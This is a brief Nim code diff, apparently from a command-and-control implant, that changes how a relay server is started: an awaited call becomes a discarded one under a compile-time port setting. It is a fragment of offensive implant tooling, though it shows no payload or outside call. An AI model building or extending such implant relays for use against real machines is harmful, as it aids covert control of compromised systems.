@@ -72,7 +72,7 @@ proc startRelayServerWithPort*(port: int, implantGuid: string, parentAddr: strin
 proc startRelayServerAsync*(implantGuid: string) {.async.} =
     when RELAY_PORT > 0:
         # Use compile-time RELAY_PORT
-        await startRelayServerWithPort(RELAY_PORT, implantGuid)
+        discard startRelayServerWithPort(RELAY_PORT, implantGuid)
     else:
         when defined debug:
             echo "[RELAY] ℹ️  No relay server configured (RELAY_PORT not defined)"
